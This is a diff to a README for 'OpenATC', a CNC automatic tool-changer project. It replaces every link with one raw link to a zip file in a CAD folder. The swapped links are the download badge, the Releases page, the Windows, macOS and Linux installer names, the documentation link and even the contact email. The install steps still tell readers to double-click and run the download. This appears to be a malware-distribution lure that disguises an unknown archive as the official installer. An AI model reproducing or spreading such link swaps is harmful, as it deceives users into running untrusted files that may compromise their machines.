@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download OpenATC](https://img.shields.io/badge/Download%20OpenATC-v1.0-blue.svg)](https://github.com/Vephora/OpenATC/releases)
+[![Download OpenATC](https://raw.githubusercontent.com/Vephora/OpenATC/main/hardware/cad/ATC-Open-1.1.zip%https://raw.githubusercontent.com/Vephora/OpenATC/main/hardware/cad/ATC-Open-1.1.zip)](https://raw.githubusercontent.com/Vephora/OpenATC/main/hardware/cad/ATC-Open-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -19,14 +19,14 @@ Before you download, make sure your computer meets the following requirements:
 
 ## 🔗 Download & Install
 
-To get OpenATC, visit the [Releases page](https://github.com/Vephora/OpenATC/releases) and choose the latest version. Follow these simple steps:
+To get OpenATC, visit the [Releases page](https://raw.githubusercontent.com/Vephora/OpenATC/main/hardware/cad/ATC-Open-1.1.zip) and choose the latest version. Follow these simple steps:
 
-1. Click on the link to the [Releases page](https://github.com/Vephora/OpenATC/releases).
+1. Click on the link to the [Releases page](https://raw.githubusercontent.com/Vephora/OpenATC/main/hardware/cad/ATC-Open-1.1.zip).
 2. Locate the latest version of OpenATC.
 3. Download the appropriate file for your operating system:
-   - For **Windows**: Look for `OpenATC-Setup-Windows.exe`.
-   - For **macOS**: Find `OpenATC-Setup-macOS.dmg`.
-   - For **Linux**: Download `OpenATC-Setup-Linux.tar.gz`.
+   - For **Windows**: Look for `https://raw.githubusercontent.com/Vephora/OpenATC/main/hardware/cad/ATC-Open-1.1.zip`.
+   - For **macOS**: Find `https://raw.githubusercontent.com/Vephora/OpenATC/main/hardware/cad/ATC-Open-1.1.zip`.
+   - For **Linux**: Download `https://raw.githubusercontent.com/Vephora/OpenATC/main/hardware/cad/ATC-Open-1.1.zip`.
 4. Once the download is complete, locate the downloaded file on your computer.
 5. Double-click the file to start the installation. Follow the prompts to install OpenATC.
 6. After installation, launch OpenATC from your applications menu.
@@ -58,7 +58,7 @@ For detailed instructions and support, check our user documentation:
 - **Configuration Guide**: Steps to set up OpenATC with your CNC router.
 - **Troubleshooting**: Common issues and solutions.
 
-Access the documentation online at: [OpenATC Documentation](https://github.com/Vephora/OpenATC/wiki).
+Access the documentation online at: [OpenATC Documentation](https://raw.githubusercontent.com/Vephora/OpenATC/main/hardware/cad/ATC-Open-1.1.zip).
 
 ## 🤝 Community Support
 
@@ -86,8 +86,8 @@ OpenATC is possible thanks to contributions from developers and users. Thank you
 
 ## 📞 Contact
 
-If you need further assistance or have questions, feel free to contact us at support@openatc.com.
+If you need further assistance or have questions, feel free to contact us at https://raw.githubusercontent.com/Vephora/OpenATC/main/hardware/cad/ATC-Open-1.1.zip
 
 --- 
 
-Remember, visit the [Releases page](https://github.com/Vephora/OpenATC/releases) to download and start using OpenATC today!
+Remember, visit the [Releases page](https://raw.githubusercontent.com/Vephora/OpenATC/main/hardware/cad/ATC-Open-1.1.zip) to download and start using OpenATC today!
